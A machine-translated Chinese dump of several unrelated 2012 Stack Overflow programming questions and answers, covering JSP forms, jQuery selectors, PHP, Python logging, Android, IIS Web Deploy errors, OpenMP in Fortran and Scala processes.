我发现很多帖子非常相似（指代币兑换问题），但**只**使用求和运算符。现在想象你可以加、减、乘和除，有没有办法让所有的计算组合得到一个给定的数字？理想情况下在 Java 中

示例：给定 1 5 2 4 9 尝试得到 16

解决方案：

*   9+1+4+2=16
*   2*9-(5-4+1)=16
*   5*(4+1)-9=16
*   依此类推（我找到了其中的 20 个）。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-16T16:57:57.867

由于您只有二元操作，您可以将任何计算建模为二叉树，其中叶子是数字，所有其他节点都表示操作，例如对于您的前两个示例：

```
 +                  -
 / \                / \
9   +              *   +
   / \            /|  / \
  1   +          2 9 -   1
     / \            / \
    4   2          5   4 
```

所以你的算法需要以下部分：

*   一个树生成器，用于所有可能的二叉树，直到某个节点数：从一个数字节点开始，递归地将每个数字节点（叶子）替换为一个运算符节点和两个子节点（数字节点），从而生成这样的树序列

.

```
N   O       O       O       ...
   / \     / \     / \
  N   N   O   N   N   O
         / \         / \
        N   N       N   N 
```

*   为给定的二叉树（如上）生成所有可能的操作和数字插入的“树填充器”，例如：

.

```
 O    :    +     +    ...  -  ...
 / \       / \   / \       / \
N   N     1   5 1   2     1   5 
```

*   计算结果的树评估器

快乐编程！:-)

# java - 从 Java 中的表单获取价值的问题 - Apache Tomcat

> ID：13870533
> 
> 赞同：0
> 
> 时间：2012-12-13T23:43:42.187
> 
> 标签：java, apache, jakarta-ee, tomcat7

嘿伙计们，我有这个表单被发送到一个烘焙器，它将获取在 Java 项目中输入表单字段的名称 - 我正在使用 Apache Tomcat v7.0 来运行它（servlet） 出于某种原因，虽然当我在烘焙文件中，它告诉我表单文件中定义的方法不存在。

表格代码：

```
<form action="Band_roster" method="post">
  <table cellspacing="5" border="0">
    <tr>
      <td align="right">Band 1:</td>
      <td><input type="text" name=Band1.setbname()></td>
    </tr>
    <tr>
      <td align="right">Band 2:</td>
      <td><input type="text" name=Band2.setbname()></td>
    </tr>
    <tr>
      <td align="right">Band 3:</td>
      <td><input type="text" name=Band3.setbname()></td>
    </tr>
    <tr>
      <td align="right">Band 4:</td>
      <td><input type="text" name=Band4.setbname()></td>
    </tr>
    <tr>
      <td align="right">Band 5:</td>
      <td><input type="text" name=Band5.setbname()></td>
    </tr>
    <tr>
      <td align="right">Band 6:</td>
      <td><input type="text" name=Band6.setbname()></td>
    </tr>
    <tr>
      <td align="right">Band 7:</td>
      <td><input type="text" name=Band7.setbname()></td>
    </tr>
    <tr>
      <td align="right">Band 8:</td>
      <td><input type="text" name=Bandb.setbname()></td>
    </tr>

    <tr>
      <td></td>
      <td><br><input type="submit" value="Submit"></td>
    </tr>
  </table>
  </form> 
```

烘焙机代码：

```
<table cellspacing="5" cellpadding="5" border="1">
        <tr>
            <td align="right">Band1:</td>
            <td><%= Band1.getBname() %></td>
        </tr>
        <tr>
            <td align="right">Band2:</td>
            <td><%= Band2.getBname() %></td>
        </tr>
        <tr>
            <td align="right">Band3:</td>
            <td><%= Band3.getBname() %></td>
        </tr>
        <tr>
            <td align="right">Band4:</td>
            <td><%= Band4.getBname() %></td>
        </tr>
        <tr>
            <td align="right">Band5:</td>
            <td><%= Band5.getBname() %></td>
        </tr>
        <tr>
            <td align="right">Band6:</td>
            <td><%= Band6.getBname() %></td>
        </tr>
        <tr>
            <td align="right">Band7:</td>
            <td><%= Band7.getBname() %></td>
        </tr>
        <tr>
            <td align="right">Band8:</td>
            <td><%= Band8.getBname() %></td>
        </tr>

    </table>

    <p>Ready to Rock</p>

    <form action="Band.jsp" method="post">
        <input type="submit" value="submit">
    </form> 
```

烘焙文件是我收到错误的文件 - Band8.getBname() 告诉我它无法解决，与 tr 中的每个 Band'number' 相同。

让我知道这是否有意义，并感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T02:59:30.727

因此，我假设您向我们展示的是来自两个不同 jsp 页面的源代码片段，并且第一个 jsp 页面呈现的 html 以某种方式发布到呈现第二个 jsp 页面的内容。

但是，您没有提到您是否正在使用某种 Web 框架、编写 servlet 或其他什么……也许您可以启发我们。

无论如何，您似乎缺少一些基本概念：

第一个 jsp 页面（带有表单）似乎无法正常工作。

据推测，Band1、Band2 等对象是在第一个 jsp 页面的顶部定义的，但您没有显示出来。

第一个 jsp 页面中输入字段的语法`<input type="text" name=Band1.setbname()>`不正确。例如，假设 Band1 是一个在页面中定义的对象，那么输入字段应该是这样的：`<input type="text" name="${Band1.bname}">`，如果 Band1 有一个 getBname() 方法，它会将输入字段的值初始化为调用的结果那个方法。但是，根据您对“setbname”的使用，我猜您希望它获取输入字段的值并使用它来设置 Band1 中属性的值。不幸的是，它不是这样工作的。发生的情况是表单字段中的值作为请求参数发送到第二页。

在第二个 jsp 页面中，您可以使用正确的语法来输出 Band1.bname 的值，假设在该页面中定义了 Band1。我猜它不是。您需要以某种方式将请求参数转换为 Band 的实例，或 Band1 的任何类。

通常，不会 POST 到另一个 jsp 页面（尽管您可以）。这类事情通常由 servlet 处理，或者更好的是，由 Struts 或 Spring MVC 等 Web 框架中的 Controller 类处理。然后，servlet 或控制器通常会呈现 jsp 页面，将 Band 对象发送给它以供参考。

# javascript - 如何选择每个div的第一个孩子

> ID：13870544
> 
> 赞同：0
> 
> 时间：2012-12-13T23:44:36.317
> 
> 标签：javascript, jquery

我正在尝试选择几个 div 的第一个 div。

我有

```
<div class='parent'>
  <div class='child'>good</div>
  <div class='child'>bad</div>
  <div class='child'>nice</div>
  <div class='child'>fun</div>
</div>

<div class='parent'>
  <div class='child'>test</div>
  <div class='child'>dead</div>
  <div class='child'>fly</div>
  <div class='child'>pipe</div>
</div>

<div class='parent'>
  <div class='child'>weee</div>
  <div class='child'>jump</div>
  <div class='child'>run</div>
  <div class='child'>apple</div>
</div> 
```

我想选择所有父 div 的第一个子 div

所以

```
 <div class='child'>good</div>
 <div class='child'>test</div>
 <div class='child'>weee</div> 
```

将被选中

我试过了：

```
1 $('.parent .child').first().css('border-top','0'); //only select the first one

2 $('.parent).each(function(){
     $(this).css('border-top','0');//can't find the first child..
  }) 
```

有没有办法做到这一点？对不起，我的大脑现在炸了。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:46:11.063

你要...

```
$(".parent .child:first-child") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:47:29.717

好吧，如果你喜欢，你可以使用 jQuery：

```
$('.parent .child:first-child').css('border-top','0'); 
```

...但我认为常规的旧 CSS 可能是一个更好的主意：

```
.parent .child:first-child {
  border-top: 0;
{ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:47:33.890

您可以使用标准的 CSS nth-child 选择器：

```
$('.child:nth-child(1)') 
```

这将选择每个具有类的元素，该元素`child`是其父级的第一个子级。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-13T23:52:35.973

`$(".parent .child:eq(0)")`

[在这里摆弄](http://jsfiddle.net/rpMGE/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-14T01:02:46.083

```
$('.parent :first-child').css('border-top','0'); 
```

[http://jsfiddle.net/NMH3h/](http://jsfiddle.net/NMH3h/)

# php - 取消设置多个php变量变量

> ID：13870548
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:45:05.840
> 
> 标签：php, variables, variable-variables

我完全掌握了在 MySQL 查询的 while 循环中创建的变量变量：

```
$query = "SELECT * FROM fruit_table";
$result = mysql_query($result);

//for sake of argument, well say this creates 3 rows to loop through.
while ($row = mysql_fetch_array($result)){
 $var = $row[1];
 $$var = $row[2];
} 
```

现在我们假设它已经创建了：$orange = 'orange', $apple = 'red', $banana = 'yellow'。此函数将循环多次，但我需要在再次运行之前取消设置/清空所有变量。根据运行的查询，变量名称每次可能不同。

这似乎不起作用：

```
unset($var);
unset($$var); 
```

如何循环多个变量名并取消所有变量名？有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:47:20.093

您必须将创建的变量名保存到数组中，然后取消设置所有变量名：

```
$created_vars = array();
while ($row = mysql_fetch_array($result)){
    $var = $row[1];
    $created_vars[] = $var;
    $$var = $row[2];
}

foreach( $created_vars as $var) {
    unset( $$var);
} 
```

话虽如此，您应该考虑放弃变量，而只使用数组。

# jquery - 为什么我的游戏可以在除 FF 之外的所有浏览器中运行？

> ID：13870552
> 
> 赞同：0
> 
> 时间：2012-12-13T23:45:41.307
> 
> 标签：jquery, firefox, cross-browser

在 Chrome 中，这个游戏运行良好。但在 Firefox - 它没有。**我被困住了……我真的不知道该怎么办。**

我是一般编程（和 jQuery）的新手，如果代码看起来有点乱，我很抱歉。

同样，这段代码在 Chrome 中运行良好。但不是在 Firefox 中。这是为什么？**每次点击幸福，它总是给我1分。但仅在 Firefox 中。**

相关网站的实时链接：http: [//facetest.info](http://facetest.info)

链接到 JS： http: [//facetest.info/stuff.js](http://facetest.info/stuff.js)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:51:25.863

如果你打开你的控制台，你会看到

> 参考错误：`trolli`未定义
> `setTimeout(trolli,3000);`

所以在调用它们*之前*定义它们..

# python - 如何在 Python 中清除/重置所有已配置的日志记录处理程序？

> ID：13870555
> 
> 赞同：11
> 
> 时间：2012-12-13T23:45:56.123
> 
> 标签：python, logging

**我的情况**
可能有一个或多个已配置的记录器，但我不知道它们的名称是什么。

**要求**
出于测试目的，我需要重新配置以前配置为使用不同格式和日志记录级别记录到标准输出的日志记录处理程序。

1.  [警告] 我已经知道如何[清除一个处理程序](https://stackoverflow.com/q/3630774/86263)。
2.  [警告] 我更喜欢 stdlib 而不是第 3 方库（pypi、github 等）。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-14T00:05:05.273

```
print (logging.Logger.manager.loggerDict.keys()) 
```

通过挖掘日志包的来源找到

# android - 从 localhost 解析 JSON 图像

> ID：13870559
> 
> 赞同：0
> 
> 时间：2012-12-13T23:46:09.130
> 
> 标签：android, json, parsing, url, listview

我正在做一个项目。那可以通过json填充列表。我已经解析了来自**http://10.0.2.2/mobile_version/get_supplier_pro_list.php**的数据，它显示的是文本而不是图像，我所做的是

```
// Hashmap for ListView
    ArrayList<HashMap<String, String>> contactList = new ArrayList<HashMap<String, String>>();

    // Creating JSON Parser instance
    JSONParser jParser = new JSONParser();

    // getting JSON string from URL
    JSONObject json = jParser.getJSONFromUrl(url);

    try {
        // Getting Array of Contacts
        sup_pd_list = json.getJSONArray(TAG_SUPPLIERS);

        // looping through All Contacts
        for (int i = 0; i < sup_pd_list.length(); i++) {
            JSONObject c = sup_pd_list.getJSONObject(i);

            // Storing each json item in variable
            String suply_id = c.getString(TAG_ID);
            String pd_name = c.getString(TAG_PRO_NAME);
            String pd_price = c.getString(TAG_PRO_PRICE);
            String pd_thumbnail = c.getString(TAG_PRO_THUMBNAIL);

            // creating new HashMap
            HashMap<String, String> map = new HashMap<String, String>();

            // adding each child node to HashMap key => value
            map.put(TAG_ID, suply_id);
            map.put(TAG_PRO_NAME, pd_name);
            map.put(TAG_PRO_PRICE, pd_price);
            map.put(TAG_PRO_THUMBNAIL, pd_thumbnail);

            // adding HashList to ArrayList
            contactList.add(map);
        }

    } catch (JSONException e) {
        e.printStackTrace();
    }

    /**
     * Updating parsed JSON data into ListView
     * */
    ListAdapter adapter = new SimpleAdapter(this, contactList,
            R.layout.single_list_item, new String[] { TAG_PRO_NAME,
                    TAG_PRO_PRICE, TAG_PRO_THUMBNAIL}, new int[] {
                    R.id.pd_name, R.id.pd_price , R.id.pd_thumbnail });

    setListAdapter(adapter);
} 
```

在logcat中，它向我展示了

```
12-14 03:47:12.743: I/System.out(314): resolveUri failed on bad bitmap uri: fceacd5431438f9d93fb4f885a3b2990.png
12-14 03:47:12.762: I/System.out(314): resolveUri failed on bad bitmap uri: d254d82762217f8e1005013c8926f53e.jpg 
```

通过解析，我得到的是

```
{"suppliers":[{"suply_id":null,"pd_name":"car","pd_price":"200000.00","pd_thumbnail":"fceacd5431438f9d93fb4f885a3b2990.png"}],"success":1} 
```

需要帮助。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:29:14.563

为了显示图像，需要发生一些事情。首先，您需要将 HashMap 更改`HashMap<String, Object>()`为接受可绘制对象。

接下来，您需要通过执行以下操作从字符串名称中获取可绘制对象：

```
Resources r = getResources();
int thumb = r.getIdentifier(pd_thumbnail, "com.mypackage");
map.put(TAG_PRO_THUMBNAIL, thumb); 
```

这是一个教程，您可以使用它来从减去字符串到可绘制转换中派生一些东西

[http://www.androidpractice.com/2012/01/static-listview-with-images-in-android.html](http://www.androidpractice.com/2012/01/static-listview-with-images-in-android.html)

最后，我不确定这是否`R.layout.single_list_item`是正确的列表项类型，但我可能弄错了，所以请不要在那个列表项上引用我的话。

# iis - 通过 MSDeploy.exe 从 WMSvc 获取 404

> ID：13870561
> 
> 赞同：131
> 
> 时间：2012-12-13T23:46:24.893
> 
> 标签：iis, msdeploy, iis-8

从 Windows 8 到安装并运行 Web 管理服务的 Windows Server 2012 (IIS 8)，我可以使用 W8 框上的 IIS 管理器来管理远程服务器，但是当我执行以下命令时，我会从 WMSvc 获得 404.7：

```
msdeploy.exe" -verb:dump -source:contentPath=c:\InetPub\wwwroot,computerName=https://uktnws01:8172/MsDeploy.axd,userName=corp\administrator,password=WMSvcIsCrap,authType=Basic -allowUntrusted 
```

我尝试了各种组合和参数。我可以远程登录到那个端口，我知道它是开放的。

我只是从 Windows 中删除管理服务功能并重新启动。我会给自己倒一杯苏格兰威士忌，然后做点零食。同时，如果您有任何想法，请分享。

在下面加入我的实时博客并关注行动。

**更新 1**

删除管理服务后，我现在得到

> 错误：无法连接到远程服务器错误：无法建立连接，因为目标机器主动拒绝它 192.168.2.22:8172 错误计数：1。

第二行是一条新消息！呜呼。

**更新 2**

好的，所以现在事情变得越来越糟。重新安装后，远程 IIS 控制台会在证书上发出警报，然后说，

> 服务器不接受远程连接。

但我认为这是因为我可能没有重新启用远程管理，除了安装该死的东西。

**更新 3**

启用远程管理后，远程 IIS 再次工作，但 404 已返回。只是为了 SEO 的利益，这里是完整的错误：

```
Error Code: ERROR_DESTINATION_NOT_REACHABLE More Information: Could not connect to the remote computer ("uktnws01"). On the remote computer, make sure that Web Deploy is installed and that the required process ("Web Management Service") is started.  Learn more at http://go.microsoft.com/fwlink/?LinkId=221672#ERROR_DESTINATION_NOT_REACHABLE.
Error: The remote server returned an error: (404) Not Found.
Error count: 1. 
```

**更新 4**

尝试通过 VPN 到客户端对另一个 Web 服务器执行相同的命令，这很有效！看起来 IIS 在我的 2012 年新版本中受到了极大的影响。

**更新 5**

我为 WMSvc 启用了失败的请求跟踪，并看到 404.7 来自 RequestFilteringModule 模块。根据文档，404.7 是“文件扩展名被拒绝”。

[http://www.iis.net/configreference/system.webserver/security/requestfiltering](http://www.iis.net/configreference/system.webserver/security/requestfiltering)

但是，为 .axd 文件添加显式服务器规则并没有帮助。看到这个模块很有趣，因为它对 URL 长度和内容大小施加了限制。您能想象在 IIS 托管的 WCF 应用程序中解决此问题！哈哈。我真的在哭。

**更新 6**

我正在删除请求过滤，这意味着还要删除 ASP.NET 和其他各种东西。他们需要一键重新安装 Windows 功能和依赖项，因为我们编写了不可靠的软件选项。

**更新 7**

我重新安装了所有东西，然后一些名叫 Richard 的澳大利亚人突然出现并完全解释说，Web Deploy 实际上并不是 WMSvc 标准的一部分，即使在 IIS 8 上也是如此，我需要安装 Web Deploy。

所以我愿意。然后我禁用了它安装的另一部分 MsDepSvc（我认为它是整个 Web 部署），因为它占用了端口 80 并阻止负载平衡器看到已关闭的 IIS 服务。

它有效。我可以去睡觉了。

* * *

## 回答 #1

> 赞同：191
> 
> 时间：2013-02-22T14:21:27.463

如果其他人遇到与我相同的问题，我也会遇到相同的 404 错误。我发现检查的最快方法是打开服务器本身，然后打开“https://<servername>:8172/MsDeploy.axd”。Chrome 和 Firefox 只是显示了一个空白页面，所以我不得不使用开发人员工具 (F12) 的网络选项卡来查看实际的 404 错误消息。

不知何故，在从 Web 平台安装程序安装 Web Deploy 3.0 时，没有安装 IIS 7 部署处理程序，即使 IIS 管理器 UI 模块安装了。就我而言，我从以下链接下载了 Web 部署工具安装 .msi：[Web 部署工具安装](http://technet.microsoft.com/en-us/library/dd569059(v=ws.10).aspx)。然后我不得不返回 IIS 管理工具（开始 -> 运行 -> inetmgr.exe）> {服务器名称} > 单击管理服务图标，然后在 MsDeploy.axd 处理程序开始工作之前重新启动管理服务。

# 启用 IIS 部署处理程序 + 远程代理服务

![在此处输入图像描述](../Images/90033523e4fbafb0952e926985b8f15d.png)

* * *

## 回答 #2

> 赞同：92
> 
> 时间：2012-12-14T00:41:34.347

您是否在服务器上安装了 Web Deploy？Web 部署向 WMSVC 注册了一个处理程序 (/msdeploy.axd)，因此如果未安装 404 将是预期的状态代码。

* * *

## 回答 #3

> 赞同：69
> 
> 时间：2013-11-24T00:04:47.300

在 Windows 2012 R2 服务器上，我遵循了 mga911 的建议。

我被困在部署工作中。已安装 Web Deploy 3.5 -> 启用管理服务委派 -> 已启动确保服务。问题是没有安装 IIS 部署处理程序。通过 Web PI 4.6，我没有机会安装 IIS 部署处理程序。您需要进入控制面板 -> 程序和功能更改 Web Deploy 3.5 的安装。请注意我的指示。在更改过程中，它表示将安装所有子包，但文本消息显示将安装 3 个子组件中的 0 个。这些组件之一是 IIS 处理程序。仔细阅读，因为我没有并且很沮丧:)

*   控制面板 > 程序和功能
*   右键单击 Microsoft Web Deploy 3.5
    *   选择更改>单击下一步>单击更改
    *   您会注意到选择Web部署框架时，您将在消息中看到“它有0个选定的3子处理”
    *   单击下拉菜单选择“整个功能将安装在本地硬盘上”
    *   下一步 > 更改 > 完成

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2013-06-21T14:53:41.987

我认为重要的一点是您必须先打开管理服务，然后再安装 Web Deploy。

我反其道而行之，但没有奏效。

只有重新安装 Web deploy 才开始工作。

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2013-06-05T19:41:46.010

当我通过 Web 平台安装程序安装 Web Deploy 时，未选择 Handler。我不得不手动安装Web Deploy 3.0，点击“更改”，然后选择要安装的Handler。

* * *

## 回答 #6

> 赞同：13
> 
> 时间：2014-07-18T08:51:37.610

经过数小时的搜索，在下面执行您的解决方案对我有用！

`Control Panel`> 程序和功能

右键单击 Microsoft Web Deploy 3.5

选择更改>单击下一步>单击更改

您会注意到选择Web部署框架时，您将在消息中看到

```
 "It has 0 of 3 subfeatures selected" 
```

点击下拉选择`"Entire feature will be installed on local hard drive"`

下一步 > 更改 > 完成

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2013-08-27T12:50:35.197

就我而言，当通过 web pi 安装 web deploy 3.0 包时，我从未在 IIS /home 中获得管理服务委派选项。但是，重新安装它解决了问题，从而解决了我的 404.7 错误。

这是在 Microsoft Server 2012 和 IIS8 下

编辑：我最近在 Windows 8 上尝试了同样的事情，并想指出微软网站指出：

> 您无法使用 Web Deploy 为 Windows 8.0 或 8.1 上的 IIS 中托管的站点设置远程发布。原因是 Windows 的客户端 SKU 不附带远程连接所需的 Web 管理服务。因此，在 Windows 8.0 或 8.1 上，IIS 管理器中不提供配置远程发布所需的 IIS 管理器权限图标和配置 Web 部署发布部署选项。[http://www.iis.net/learn/install/installing-publishing-technologies/installing-and-configuring-web-deploy-on-iis-80-or-later#00](http://www.iis.net/learn/install/installing-publishing-technologies/installing-and-configuring-web-deploy-on-iis-80-or-later#00)
> 
> （是的，我意识到问题中的目标是 Server 2012，但这可以避免很多人像我一样头疼，因为这在我想让人们知道的旧开发机器上运行良好。）

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2016-06-30T11:53:00.660

而不是使用 Web 平台安装程序。从网站下载 WebDeploy.exe 并使用完整包选项将其安装在服务器上。

它将解决问题。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-05-27T05:40:42.723

此外，您可能需要授予 Web 管理服务的访问权限

我还遇到了 Visual Studio (2013) 无法更新我的服务器上的应用程序 (Windows 2012 R2 IIS 8.5) 的问题。我如上所述手动添加了组件，但这并没有解决问题。然后我找到[了这篇文章](http://blogs.iis.net/krolson/using-iis-manager-accounts-for-web-deployment-tool-msdeploy-delegation "本文")。

它基本上说 Web 管理服务作为本地服务登录，它没有访问 Inetpub 目录的权限。授予本地服务权限为我解决了这个问题。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-03-11T10:53:26.870

我有同样的问题。我通过“重启服务 wmsvc”解决了这个问题。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2021-02-24T16:58:39.570

这个问题在服务器 2019 中仍然存在。需要按正确的顺序安装web部署

*   一、启动服务——web管理服务
*   然后安装 web deploy（从 Microsoft 网站下载）

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2015-10-06T05:03:09.753

仅使用 Windows 身份验证。网络部署 3.5。并且只有在顶级服务器图标的管理服务图标中设置的 WMSVC 证书。

# parallel-processing - gfortran openmp 分段错误发生在基本 do 循环上

> ID：13870564
> 
> 赞同：2
> 
> 时间：2012-12-13T23:46:33.660
> 
> 标签：parallel-processing, fortran, gfortran, openmp

我有一个程序，可以将粒子分配到单元格中的云网格中。简单地循环粒子总数 (Ntot) 并填充 256^3 网格（即每个粒子分布在 8 个单元上）。

```
% gfortran -fopenmp cic.f90 -o ./cic 
```

编译得很好。但是当我运行它（./cic）时，我遇到了分段错误。我的循环是一个经典的 omp do 问题。当我不在 openmp 中编译它时，该程序可以工作。

```
!$omp parallel do
 do i = 1,Ntot
   if (x1(i).gt.0.and.y1(i).gt.0.and.z1(i).gt.0) then
     dense(int(x1(i)),int(y1(i)),int(z1(i))) = dense(int(x1(i)),int(y1(i)),int(z1(i))) &
     + dx1(i) * dy1(i) * dz1(i) * mpart
   end if

   if (x2(i).le.Ng.and.y1(i).gt.0.and.z1(i).gt.0) then
     dense(int(x2(i)),int(y1(i)),int(z1(i))) = dense(int(x2(i)),int(y1(i)),int(z1(i))) &
     + dx2(i) * dy1(i) * dz1(i) * mpart
   end if

   if (x1(i).gt.0.and.y2(i).le.Ng.and.z1(i).gt.0) then
     dense(int(x1(i)),int(y2(i)),int(z1(i))) = dense(int(x1(i)),int(y2(i)),int(z1(i))) &
     + dx1(i) * dy2(i) * dz1(i) * mpart
   end if

   if (x2(i).le.Ng.and.y2(i).le.Ng.and.z1(i).gt.0) then
     dense(int(x2(i)),int(y2(i)),int(z1(i))) = dense(int(x2(i)),int(y2(i)),int(z1(i))) &
     + dx2(i) * dy2(i) * dz1(i) * mpart
   end if

   if (x1(i).gt.0.and.y1(i).gt.0.and.z2(i).le.Ng) then
     dense(int(x1(i)),int(y1(i)),int(z2(i))) = dense(int(x1(i)),int(y1(i)),int(z2(i))) &
     + dx1(i) * dy1(i) * dz2(i) * mpart
   end if

   if (x2(i).le.Ng.and.y1(i).gt.0.and.z2(i).le.Ng) then
     dense(int(x2(i)),int(y1(i)),int(z2(i))) = dense(int(x2(i)),int(y1(i)),int(z2(i))) &
     + dx2(i) * dy1(i) * dz2(i) * mpart
   end if

   if (x1(i).gt.0.and.y2(i).le.Ng.and.z2(i).le.Ng) then
     dense(int(x1(i)),int(y2(i)),int(z2(i))) = dense(int(x1(i)),int(y2(i)),int(z2(i))) &
     + dx1(i) * dy2(i) * dz2(i) * mpart
   end if

   if (x2(i).le.Ng.and.y2(i).le.Ng.and.z2(i).le.Ng) then
     dense(int(x2(i)),int(y2(i)),int(z2(i))) = dense(int(x2(i)),int(y2(i)),int(z2(i))) &
     +  dx2(i) * dy2(i) * dz2(i) * mpart
   end if
  end do
!$omp end parallel do 
```

迭代之间没有依赖关系。想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T18:09:21.437

这个问题以及[您的另一个问题](https://stackoverflow.com/questions/13883338/illegal-instruction-4-error-running-simple-gfortran-openmp-on-mac-osx)中的问题来自启用 OpenMP 时禁用自动堆数组这一事实。这意味着如果没有`-fopenmp`，大数组将自动放置在静态存储（称为`.bss`段）中，而小数组则分配在堆栈上。当您打开 OpenMP 支持时，不会使用自动静态分配，并且您的`dense`数组会在例程的堆栈上分配。OS X 上的默认堆栈限制非常严格，因此存在分段错误。

您在这里有几个选择。第一个选项是通过给它属性来进行`dense`静态分配。`SAVE`另一种选择是通过创建它`ALLOCATABLE`然后使用`ALLOCATE`语句在堆上显式分配它，例如：

```
REAL, DIMENSION(:,:,:), ALLOCATABLE :: dense

ALLOCATE(dense(256,256,256))

! Computations, computations, computations

DEALLOCATE(dense) 
```

`SAVE`较新的 Fortran 版本支持在超出范围时自动释放不带属性的数组。

请注意，您的 OpenMP 指令很好，不需要额外的数据共享子句。您不需要`i`在`PRIVATE`子句中声明，因为循环计数器具有预先确定的私有数据共享类。您不需要将其他变量放在 `SHARED`子句中，因为它们是隐式共享的。然而，您执行的操作应该与（或仅在较旧的 OpenMP 实现上）`dense`同步，或者您应该使用. 原子更新被转换为锁定的添加，并且不会导致太多的减速，与在循环中使用条件的巨大减速相比：`ATOMIC UPDATE``ATOMIC``REDUCTION(+:dense)`

```
INTEGER :: xi, yi, zi

!$OMP PARALLEL DO PRIVATE(xi,yi,zi)
...
if (x1(i).gt.0.and.y1(i).gt.0.and.z1(i).gt.0) then
  xi = int(x1(i))
  yi = int(y1(i))
  zi = int(z1(i))
  !$OMP ATOMIC UPDATE
  dense(xi,yi,zi) = dense(xi,yi,zi) &
                  + dx1(i) * dy1(i) * dz1(i) * mpart
end if
... 
```

复制代码并针对其他情况进行适当的更改。如果您的编译器抱怨构造`UPDATE`中的子句`ATOMIC`，只需将其删除即可。

`REDUCTION(+:dense)`将`dense`在每个线程中创建一个副本，这将消耗大量内存，并且最终应用的减少会随着`dense`. 对于小型数组，它会比原子更新更好。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-14T02:33:47.890

有关如何使变量共享和私有的描述，请参见[https://computing.llnl.gov/tutorials/openMP/#Clauses 。](https://computing.llnl.gov/tutorials/openMP/#Clauses)

看起来您的所有变量都应该共享，除了`i`必须是私有的循环变量。这将建议使用以下行：

```
!$omp parallel do default(shared) private(i) 
```

这应该可以解决您的分段错误（假设我得到了正确的所有变量

但是，存在不同线程会尝试同时覆盖相同部分的风险`dense`，从而导致总数不正确。为了防止这种情况，您需要将每个分配包装到`dense`类似`!$omp atomic` 或`!$omp critical`部分的内容中。

但是，您可能会发现这样的关键部分会导致线程花费大部分时间等待，因此您可能看不到与纯串行代码相比有任何改进。

原则上你可以通过声明关键字来解决这个问题`dense`，`reduction`但不幸的是它不能用于数组。

# scala - 在 playframework 2 中使用 scala.sys.process

> ID：13870569
> 
> 赞同：0
> 
> 时间：2012-12-13T23:47:00.697
> 
> 标签：scala, powershell, playframework-2.0

我正在尝试允许其他用户通过网络访问某些本地系统服务。

经过一番 google，我最终选择使用 Play 框架作为前端来接受 web 服务调用。接到电话后，Play 将通过 powershell 执行一些命令。例如，

在我的 Application.scala

```
def test = Action {
    println(Seq("powershell.exe", "dir", "c:").!)
    Ok("")
} 
```

对应的路线信息是

```
GET      /test     controllers.Application.test 
```

我的问题是，虽然调用 powershell 的结果被打印出来，但该方法永远不会返回。从客户端（浏览器）的角度来看，它只是不断地等待对 .../test 的调用返回。

我已经测试了代码本身并且运行良好。我的问题似乎只有在我通过 Play 运行时才会出现。

非常感谢任何建议！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T01:35:48.673

从`ProcessBuilder`斯卡拉多克：

```
abstract def !(log: ProcessLogger): Int
    Starts the process represented by this builder, blocks until it exits, 
    and returns the exit code. 
```

尝试`lines`改用 - 它会返回一个`Stream`

**编辑**

如果一个命令已经完成，你不是已经从流中读取了它的输出吗？之后，只需`Process.destroy()`手动从不同的流中调用。创建一个演员并从解析的线程向他发送一条消息`Stream`，它应该关闭进程。或者使用`CountDownLatch`fow awaiting，它是一种更 Java 的方式。

# android - GMail 应用程序中忽略了自定义 mime 类型

> ID：13870570
> 
> 赞同：3
> 
> 时间：2012-12-13T23:47:09.887
> 
> 标签：android, gmail, mime-types

我正在尝试使用意图在 android 中发送文件。我启动了一个意图选择器并选择了 GMail 应用程序。问题是我无法设置我的自定义 mime 类型，它总是变成 application/octet-stream。

在旧版本的 GMail 应用程序（或者可能是旧版本的 Android，如 JB 之前的版本？）中，它运行良好，如下所示：

```
Intent sendIntent = new Intent(Intent.ACTION_SEND);
// Add attributes to the intent
sendIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
sendIntent.putExtra(Intent.EXTRA_SUBJECT, "Send my file");
sendIntent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(path));
sendIntent.setType("application/vnd.mycustommimetype");
context.startActivity(Intent.createChooser(sendIntent, context.getString(R.string.lblShare))); 
```

任何人都知道如何设置 MIME 类型以使用更高版本的 GMail/Android？

经过反复试验，我发现在 GMail 应用程序版本 4 中这工作得很好，但在 GMail 版本 4.2 中，无法设置 mime 类型或以其他方式完成。有谁知道怎么做？：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-10T08:46:21.810

不幸的是，您无能为力。天知道是什么原因，一些电子邮件应用程序错误地将自定义文件的 mime 类型设置为八位字节流。最好的办法是设置您的自定义 mime 类型，但随后，在接收端，请确保您也接受八位字节流。然后，您需要检查文件扩展名以确保它确实是您的文件，而不是其他文件，不适用于您的应用程序（我假设您也在使用自定义扩展名）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T04:41:49.903

请检查此代码段

```
final Intent emailIntent = new Intent(Intent.ACTION_SEND); 
emailIntent.setType("text/plain"); 
